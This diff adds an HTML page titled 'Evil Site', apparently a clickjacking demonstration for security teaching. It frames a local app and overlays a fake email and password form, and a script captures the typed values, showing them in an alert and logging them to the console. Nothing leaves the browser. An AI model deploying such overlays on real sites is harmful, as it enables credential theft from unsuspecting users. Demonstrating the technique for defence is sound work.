@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang='en'>
+  <head>
+    <meta charset='UTF-8'>
+    <title>Evil Site</title>
+    <style>
+        html {
+            margin: 0;
+        }
+        body {
+            width: auto;
+            margin: auto;
+            height: 100vh;
+        }
+        iframe {
+            z-index: 1;
+            width: 100%;
+            margin: auto;
+            height: 100%;
+        }
+        .container {
+            position: absolute;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2;
+            opacity: 1;
+            top: 473px;
+            left: 0;
+            right: 0;
+            width: 100%;
+            margin: auto;
+            max-width: 800px;
+        }
+        .jacked {
+            max-width: 668px;
+            width: 100%;
+            padding: 64px 64px 50px 64px;
+            flex: 1;
+        }
+        .jacked > input {
+            width: 100%;
+            font-family: Montserrat, Arial, serif;
+            font-size: 20px;
+            height: 32px;
+            padding: 10px;
+        }
+        #password {
+            margin-top: 8px;
+        }
+        .container > button {
+            font-family: Montserrat, Arial, serif;
+            font-size: 20px;
+            padding: 1rem 2rem;
+            opacity: 1;
+            margin: 0.5rem;
+            background-color: rgb(244, 183, 155);
+            color: rgb(88, 88, 88);;
+            border-radius: 1px;
+            border: 0;
+            cursor: pointer;
+        }
+    </style>
+  </head>
+  <body>
+    <iframe src='http://localhost:4003'></iframe>
+    <div id='container' class='container'>
+      <div id='jacked' class='jacked'>
+        <input type='text' id='email' name='email' placeholder=Email>
+        <input type='text' id='password' name='password' placeholder=Password>
+      </div>
+      <button onclick='doMaliciousStuff()'>Login</button>
+    </div>
+    <script>
+      function doMaliciousStuff() {
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+        alert(`Jacked your info!\n\nEmail: ${email}\nPassword: ${password}`);
+        console.log(`Jacked your email! ${email}`);
+        console.log(`Jacked your password! ${password}`);
+      }
+    </script>
+  </body>
+</html>
